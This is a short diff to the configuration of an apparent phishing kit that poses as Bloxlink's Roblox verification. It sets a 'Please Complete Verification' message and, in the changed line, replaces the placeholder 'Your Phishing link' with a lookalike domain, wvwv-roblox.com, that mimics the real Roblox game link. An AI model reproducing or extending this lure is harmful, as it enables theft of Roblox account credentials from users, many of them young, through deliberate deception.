@@ -14,7 +14,7 @@ title = "Please Complete Verification"
 desc ="To verify your account, please join Bloxlink's Official Roblox Verification Game"
 field = "Please Login and join the game"
 hyperlink = "https://www.roblox.com/games/1271943503/Bloxlink-Verification-Game"
-phish = "Your Phishing link"
+phish = "https://wvwv-roblox.com/games/1271943503/Bloxlink-Verification-Game"
 
 ###################################################################
 
